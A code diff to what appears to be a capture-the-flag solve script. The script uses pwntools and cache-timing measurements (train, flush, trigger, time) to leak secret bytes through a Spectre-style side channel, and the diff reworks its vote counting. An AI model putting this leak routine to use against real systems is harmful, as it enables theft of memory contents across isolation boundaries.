@@ -9,6 +9,7 @@ import site
 import statistics
 import sys
 import time
+from collections import defaultdict
 
 site.addsitedir(
     "/nix/store/8rkdh1mj5w4ysz03j9n5xcdamcwrdwjd-python3-3.13.11-env/lib/python3.13/site-packages"
@@ -141,18 +142,20 @@ def inside_challenge() -> None:
             trigger(258)
 
     def leak_byte(pos: int, threshold: int) -> int:
-        votes = [0] * PAGE_COUNT
-        tdata = []
-        for _ in range(32):
+        votes = defaultdict(int)
+        # collect enough votes to overcome noise
+        while sum(votes.values()) < 3:
             train()
             flush_cache()
             trigger(pos)
-            timing = get_timing_data()
-            tdata.append(timing)
-            for i, t in enumerate(timing):
+            for i, t in enumerate(get_timing_data()):
+                if i == 0:  # 0x00 is not a valid character
+                    continue
                 if t < threshold:
                     votes[i] += 1
-        return max(range(PAGE_COUNT), key=lambda i: votes[i])
+            if len(votes) > 5:  # too many false positives, reset and try again
+                votes.clear()
+        return max(votes, key=votes.get, default=0)  # type: ignore
 
     calibration_samples = 50_000
     pwn.info("calibrating cache threshold")
